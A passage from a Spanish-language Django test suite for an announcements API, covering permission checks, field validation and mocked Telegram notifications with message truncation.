        mock_generar_embedding.assert_called_with(comunicado_creado.id)



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_para_tests_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.requests.post')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_ejecuta_notificacion_telegram(self, mock_generar_embedding, mock_requests_post):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y un área de interés con un ID de canal de Telegram configurado.
        When: Se realiza una petición POST para crear un comunicado.
        Then: El servicio debe realizar una petición HTTP POST a la API de Telegram con el mensaje.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        canal_id_test = '-100999888777'
        self.area_juventud.telegram_channel_id = canal_id_test
        self.area_juventud.save()

        payload = {
            "titulo": "Aviso de Ensayo",
            "contenido": "Se recuerda el ensayo de mañana a las 21:00h.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        mock_requests_post.assert_called_once()

        args, kwargs = mock_requests_post.call_args
        url_llamada = args[0]
        data_enviada = kwargs.get('data')

        self.assertIn('token_falso_para_tests_123', url_llamada)

        self.assertEqual(data_enviada['chat_id'], canal_id_test)
        self.assertIn(payload['titulo'], data_enviada['text'])
        self.assertEqual(data_enviada['parse_mode'], 'HTML')



    @override_settings(TELEGRAM_BOT_TOKEN='bot_token_test_abc')
    @patch('api.servicios.comunicado.creacion_comunicado_service.requests.post')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_notifica_a_multiples_canales_telegram(self, mock_embedding, mock_requests):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y dos áreas con canales de Telegram configurados.
        When: Se realiza una petición POST vinculando ambas áreas.
        Then: El servicio debe realizar dos peticiones HTTP a Telegram (una por canal).
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        canal_1 = "-100111"
        canal_2 = "-100222"
        self.area_juventud.telegram_channel_id = canal_1
        self.area_juventud.save()
        self.area_caridad.telegram_channel_id = canal_2
        self.area_caridad.save()

        payload = {
            "titulo": "Mensaje Multi-Canal",
            "contenido": "Noticia importante para Juventud y Caridad.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id, self.area_caridad.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertEqual(mock_requests.call_count, 2)

        destinos = [call.kwargs['data']['chat_id'] for call in mock_requests.call_args_list]
        self.assertIn(canal_1, destinos)
        self.assertIn(canal_2, destinos)



    @override_settings(TELEGRAM_BOT_TOKEN='bot_token_test_abc')
    @patch('api.servicios.comunicado.creacion_comunicado_service.requests.post')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_con_areas_sin_telegram_no_notifica(self, mock_embedding, mock_requests):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y un área que NO tiene canal de Telegram (valor None o vacío).
        When: Se realiza una petición POST para crear un comunicado.
        Then: El comunicado debe crearse con éxito, pero no debe dispararse ninguna petición a Telegram.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = None
        self.area_juventud.save()

        payload = {
            "titulo": "Comunicado sin Telegram",
            "contenido": "Este mensaje solo vive en la App, no va a canales externos.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        mock_requests.assert_not_called()

        mock_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN=None) # Simulamos que no existe el token
    @patch('api.servicios.comunicado.creacion_comunicado_service.requests.post')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_sin_token_telegram_crea_registro_sin_notificar(self, mock_embedding, mock_requests):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin y una configuración del servidor donde falta el TELEGRAM_BOT_TOKEN.
        When: Se realiza una petición POST para crear un comunicado.
        Then: El comunicado debe crearse (201) pero el sistema no debe intentar llamar a la API de Telegram.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "-100123"
        self.area_juventud.save()

        payload = {
            "titulo": "Comunicado sin Token de Bot",
            "contenido": "Probando la robustez del servicio ante falta de configuración.",
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        self.assertTrue(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_requests.assert_not_called()

        mock_embedding.assert_called_once()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_contenido_html_valido_retorna_201(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario con permisos y un payload con contenido HTML seguro.
        When: Se realiza una petición POST al endpoint de comunicados.
        Then: La vista debe permitir las etiquetas HTML permitidas y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        contenido_html = (
            "<p>Estimados hermanos:</p>"
            "<ul>"
            "<li><b>Punto 1:</b> Importante.</li>"
            "<li><i>Punto 2:</i> Relevante.</li>"
            "</ul>"
        )

        payload = {
            "titulo": "Comunicado con Formato",
            "contenido": contenido_html,
            "tipo_comunicacion": "INFORMATIVO",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.contenido, contenido_html)

        self.assertEqual(response.data['contenido'], contenido_html)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_admin_puede_crear_comunicado(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario autenticado con el atributo 'esAdmin' en True.
        When: Se realiza una petición POST con datos válidos.
        Then: La vista debe permitir la acción y retornar un código HTTP 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado de Administración",
            "contenido": "Contenido generado por un administrador del sistema.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        self.assertTrue(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_generar_embedding.assert_called_once()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_junta_gobierno_puede_crear_comunicado(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario que NO es admin pero pertenece al cuerpo 'JUNTA_GOBIERNO'.
        When: Se realiza una petición POST con datos válidos.
        Then: La vista debe permitir la creación y retornar un código HTTP 201 Created.
        """
        self.usuario.esAdmin = False
        self.usuario.save()

        cuerpo_junta, _ = CuerpoPertenencia.objects.get_or_create(
            nombre_cuerpo='JUNTA_GOBIERNO'
        )
        HermanoCuerpo.objects.create(
            hermano=self.usuario,
            cuerpo=cuerpo_junta,
            anio_ingreso=2024
        )

        payload = {
            "titulo": "Comunicado de la Junta",
            "contenido": "Información oficial de la Junta de Gobierno.",
            "tipo_comunicacion": "SECRETARIA",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        self.assertTrue(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.autor, self.usuario)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_admin_y_junta_puede_crear_comunicado(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario que es simultáneamente administrador y miembro de la Junta de Gobierno.
        When: Se realiza una petición POST con datos válidos.
        Then: La vista debe permitir la creación sin conflictos y retornar 201 Created.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        cuerpo_junta, _ = CuerpoPertenencia.objects.get_or_create(nombre_cuerpo='JUNTA_GOBIERNO')
        HermanoCuerpo.objects.create(
            hermano=self.usuario,
            cuerpo=cuerpo_junta,
            anio_ingreso=2024
        )

        payload = {
            "titulo": "Comunicado de Superusuario",
            "contenido": "Usuario con máximo nivel de privilegios.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        self.assertTrue(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.autor, self.usuario)



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_sin_permisos_retorna_error(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario autenticado que NO es admin y NO pertenece a la JUNTA_GOBIERNO.
        When: Intenta realizar una petición POST para crear un comunicado.
        Then: La API debe denegar la operación (actualmente retorna 400 debido al orden de validación).
        """
        self.usuario.esAdmin = False
        self.usuario.save()
        
        HermanoCuerpo.objects.filter(
            hermano=self.usuario, 
            cuerpo__nombre_cuerpo='JUNTA_GOBIERNO'
        ).delete()

        payload = {
            "titulo": "Intento de intrusión",
            "contenido": "Un usuario normal no debería poder publicar esto.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_no_autenticado_retorna_401(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un cliente que no ha iniciado sesión (sin token de autenticación).
        When: Intenta realizar una petición POST para crear un comunicado.
        Then: La API debe rechazar la petición con un código HTTP 401 Unauthorized.
        """
        self.client.force_authenticate(user=None)

        payload = {
            "titulo": "Intento anónimo",
            "contenido": "Alguien sin cuenta intentando publicar.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_sin_relacion_cuerpos_deniega_acceso(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario autenticado que no tiene ninguna entrada en la tabla HermanoCuerpo.
        When: Intenta realizar una petición POST para crear un comunicado.
        Then: La API debe denegar el acceso (403 o 400 según el flujo actual) y no romper el servidor.
        """
        self.usuario.esAdmin = False
        self.usuario.save()

        HermanoCuerpo.objects.filter(hermano=self.usuario).delete()

        payload = {
            "titulo": "Test de Robustez",
            "contenido": "Verificando que el sistema no explota sin cuerpos asociados.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_400_BAD_REQUEST])

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_usuario_eliminado_durante_proceso_retorna_error(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario que se autentica pero es eliminado de la DB antes de completar la creación.
        When: Se intenta procesar la petición de creación.
        Then: El sistema debe manejar la falta de integridad y no retornar un Error 500.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado Fantasma",
            "contenido": "El autor va a desaparecer en breve.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        user_id = self.usuario.id
        self.usuario.delete()

        response = self.client.post(self.url, data=payload, format='json')

        self.assertNotEqual(response.status_code, status.HTTP_500_INTERNAL_SERVER_ERROR)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_sin_titulo_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un payload incompleto (falta el título).
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request y el error debe especificar el campo 'titulo'.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "contenido": "Cuerpo del mensaje sin cabecera.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('titulo', response.data)

        self.assertFalse(Comunicado.objects.exists())

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_sin_contenido_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un payload sin el campo 'contenido'.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request y señalar el error en dicho campo.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Título de prueba",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('contenido', response.data)

        self.assertFalse(Comunicado.objects.exists())
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_sin_tipo_comunicacion_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un payload olvidando el campo 'tipo_comunicacion'.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request y especificar el error en dicho campo.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Comunicado sin categoría",
            "contenido": "Cuerpo del mensaje perfectamente redactado.",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('tipo_comunicacion', response.data)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_titulo_vacio_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un payload con el título como cadena vacía.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request indicando que el campo no puede estar en blanco.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "",
            "contenido": "Contenido válido, pero sin título.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('titulo', response.data)

        self.assertFalse(Comunicado.objects.exists())
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_contenido_vacio_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un payload con el contenido como cadena vacía.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request indicando que el contenido no puede estar en blanco.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Título Válido",
            "contenido": "",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('contenido', response.data)

        self.assertFalse(Comunicado.objects.exists())
        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_tipo_comunicacion_invalido_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía un tipo_comunicacion que no existe en los CHOICES del modelo.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request indicando que el valor no es válido.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Título de prueba",
            "contenido": "Contenido del comunicado.",
            "tipo_comunicacion": "TIPO_QUE_NO_EXISTE",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('tipo_comunicacion', response.data)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_area_inexistente_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que intenta asociar un comunicado a un ID de área que no existe.
        When: Se realiza la petición POST con un ID inválido (ej: 9999).
        Then: La API debe retornar 400 Bad Request y especificar el error en 'areas_interes'.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        id_falso = 99999
        payload = {
            "titulo": "Comunicado a área inexistente",
            "contenido": "Intentando enviar un mensaje al vacío.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [id_falso]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('areas_interes', response.data)

        self.assertFalse(Comunicado.objects.filter(titulo=payload["titulo"]).exists())

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_areas_interes_como_string_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía 'areas_interes' como un string en lugar de una lista.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request indicando que el formato es incorrecto.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Test de formato",
            "contenido": "Enviando áreas como string.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": str(self.area_juventud.id)
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('areas_interes', response.data)

        mock_generar_embedding.assert_not_called()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_areas_interes_duplicadas_procesa_correctamente(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía una lista de 'areas_interes' con IDs duplicados.
        When: Se realiza la petición POST.
        Then: La API debe procesar la petición con éxito (201) y asociar el área una sola vez.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        id_area = self.area_juventud.id
        payload = {
            "titulo": "Test de Duplicados",
            "contenido": "Enviando áreas repetidas en el payload.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [id_area, id_area]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.areas_interes.count(), 1)
        self.assertEqual(comunicado.areas_interes.first().id, id_area)

        mock_generar_embedding.assert_called_once()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_contenido_como_numero_es_convertido_a_string(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía el campo 'contenido' como un valor numérico.
        When: Se realiza la petición POST.
        Then: La API castea automáticamente el número a string y crea el comunicado con éxito (201).
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": "Título numérico",
            "contenido": 12345678,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        comunicado = Comunicado.objects.get(titulo=payload["titulo"])
        self.assertEqual(comunicado.contenido, "12345678")

        mock_generar_embedding.assert_called_once()



    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    def test_post_comunicado_titulo_como_lista_retorna_400(self, mock_generar_embedding):
        """
        Test: Casos de prueba - POST /comunicados/

        Given: Un usuario admin que envía el 'titulo' como una lista en lugar de un string.
        When: Se realiza la petición POST.
        Then: La API debe retornar 400 Bad Request por error de tipo de dato.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        payload = {
            "titulo": ["Título en formato incorrecto"],
            "contenido": "Contenido válido.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)

        self.assertIn('titulo', response.data)

        self.assertFalse(Comunicado.objects.filter(contenido=payload["contenido"]).exists())
        mock_generar_embedding.assert_not_called()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_con_imagen_usa_sendPhoto_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un usuario admin que crea un comunicado adjuntando una imagen de portada válida.
        When: Se realiza la petición POST (multipart).
        Then: El sistema procesa la imagen y utiliza el endpoint 'sendPhoto' de Telegram.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_juventud_test"
        self.area_juventud.save()

        bytes_png_real = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\x0d\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
        
        imagen_simulada = SimpleUploadedFile(
            name='test_image.png',
            content=bytes_png_real,
            content_type='image/png'
        )

        payload = {
            "titulo": "Comunicado con Foto para Telegram",
            "contenido": "Validando el envío multimedia con PNG real.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id], 
            "imagen_portada": imagen_simulada
        }

        response = self.client.post(self.url, data=payload, format='multipart')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        llamada_send_photo = False
        for call in mock_requests_post.mock_calls:
            url_llamada = call.args[0] if call.args else call.kwargs.get('url', '')
            if 'sendPhoto' in str(url_llamada):
                llamada_send_photo = True
                break
        
        self.assertTrue(llamada_send_photo, "El sistema no intentó llamar al endpoint 'sendPhoto' de Telegram.")
        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_sin_imagen_usa_sendMessage_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un usuario admin que crea un comunicado sin adjuntar ninguna imagen.
        When: Se realiza la petición POST.
        Then: El sistema utiliza el endpoint 'sendMessage' de Telegram.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_test_sin_foto"
        self.area_juventud.save()

        payload = {
            "titulo": "Comunicado Solo Texto",
            "contenido": "Este comunicado no lleva imagen adjunta.",
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        llamadas = [str(call.args[0] if call.args else call.kwargs.get('url', '')) 
                for call in mock_requests_post.mock_calls]
        
        usó_send_message = any('sendMessage' in url for url in llamadas)
        usó_send_photo = any('sendPhoto' in url for url in llamadas)

        self.assertTrue(usó_send_message, "El sistema debería haber llamado a 'sendMessage'.")
        self.assertFalse(usó_send_photo, "El sistema NO debería haber llamado a 'sendPhoto' sin imagen.")

        mock_generar_embedding.assert_called_once()



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_corto_se_envia_completo_a_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un comunicado con un título y contenido cortos (bajo los límites de Telegram).
        When: Se realiza la petición POST.
        Then: El mensaje enviado a Telegram debe ser idéntico al original, sin truncado ni puntos suspensivos.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_corto"
        self.area_juventud.save()

        titulo_test = "Aviso"
        contenido_test = "Mensaje corto."
        
        payload = {
            "titulo": titulo_test,
            "contenido": contenido_test,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        last_call_kwargs = mock_requests_post.call_args.kwargs
        mensaje_enviado = last_call_kwargs.get('data', {}).get('text', '')

        self.assertIn(f"<b>🔔 Nuevo Comunicado: {titulo_test}</b>", mensaje_enviado)
        self.assertIn(contenido_test, mensaje_enviado)
        self.assertNotIn("...", mensaje_enviado)



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_largo_se_recorta_a_3000_en_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un comunicado con un contenido extremadamente largo (> 3000 caracteres).
        When: Se realiza la petición POST.
        Then: El mensaje enviado a Telegram debe estar truncado a 3000 caracteres y terminar en '...'.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_limites"
        self.area_juventud.save()

        contenido_muy_largo = "A" * 3500
        
        payload = {
            "titulo": "Aviso Urgente",
            "contenido": contenido_muy_largo,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id]
        }

        response = self.client.post(self.url, data=payload, format='json')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        last_call_kwargs = mock_requests_post.call_args.kwargs
        mensaje_enviado = last_call_kwargs.get('data', {}).get('text', '')

        self.assertTrue(mensaje_enviado.endswith("..."), "El mensaje largo debería terminar con '...'")

        self.assertLessEqual(len(mensaje_enviado), 3500)
        self.assertIn("AAAA...", mensaje_enviado)



    @override_settings(TELEGRAM_BOT_TOKEN='token_falso_de_test_123')
    @patch('api.servicios.comunicado.creacion_comunicado_service.generar_y_guardar_embedding_async')
    @patch('requests.post')
    def test_post_comunicado_con_imagen_caption_se_recorta_a_1000_en_telegram(self, mock_requests_post, mock_generar_embedding):
        """
        Test: Casos de prueba - Integración con Telegram

        Given: Un comunicado con imagen y un contenido muy extenso (> 1000 caracteres).
        When: Se realiza la petición POST (multipart).
        Then: La leyenda (caption) enviada a Telegram debe estar truncada a 1000 caracteres más el sufijo informativo.
        """
        self.usuario.esAdmin = True
        self.usuario.save()

        self.area_juventud.telegram_channel_id = "@canal_fotos_largas"
        self.area_juventud.save()

        bytes_png_real = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\x0d\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
        imagen_simulada = SimpleUploadedFile(
            name='test_image.png',
            content=bytes_png_real,
            content_type='image/png'
        )

        contenido_extenso = "B" * 1500
        
        payload = {
            "titulo": "Noticia con Foto",
            "contenido": contenido_extenso,
            "tipo_comunicacion": "GENERAL",
            "areas_interes": [self.area_juventud.id],
            "imagen_portada": imagen_simulada
        }

        response = self.client.post(self.url, data=payload, format='multipart')

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)

        last_call_kwargs = mock_requests_post.call_args.kwargs
        caption_enviada = last_call_kwargs.get('data', {}).get('caption', '')

        self.assertTrue(caption_enviada.endswith("... (ver web)"), "El caption debería indicar que hay más contenido.")

